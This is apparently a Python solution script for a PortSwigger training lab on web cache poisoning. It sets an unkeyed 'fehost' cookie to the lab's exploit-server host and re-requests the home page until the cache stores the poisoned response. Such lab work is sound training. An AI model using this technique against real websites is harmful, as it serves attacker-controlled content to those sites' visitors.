"""
Lab 2: Web cache poisoning with an unkeyed cookie
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie
Difficulty: Practitioner

📝 Same shape as Lab 1, but the unkeyed/reflected input is a COOKIE
(commonly 'fehost') rather than a header.
"""

from utils import get_session, cache_status, poison_until_hit, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
EXPLOIT_HOST = "exploit-YOUR-LAB-ID.exploit-server.net"
COOKIE_NAME = "fehost"  # confirm the actual cookie name via Burp if different


def run():
    s = get_session()
    s.cookies.set(COOKIE_NAME, "example.com")

    note("Step 1: confirm reflection and that the cookie isn't keyed.")
    r = s.get(f"{TARGET}/?cb=12345")
    log(f"X-Cache: {cache_status(r)!r}, reflected: {'example.com' in r.text}")

    note("Step 2: poison with cache-buster + malicious cookie value.")
    s.cookies.set(COOKIE_NAME, EXPLOIT_HOST)
    poison_until_hit(s, f"{TARGET}/?cb=12345")

    note("Step 3: re-poison the real home page URL, no cache-buster.")
    r = poison_until_hit(s, f"{TARGET}/")

    if r:
        log(f"Poisoned response reflects exploit host: {EXPLOIT_HOST in r.text}")


if __name__ == "__main__":
    run()
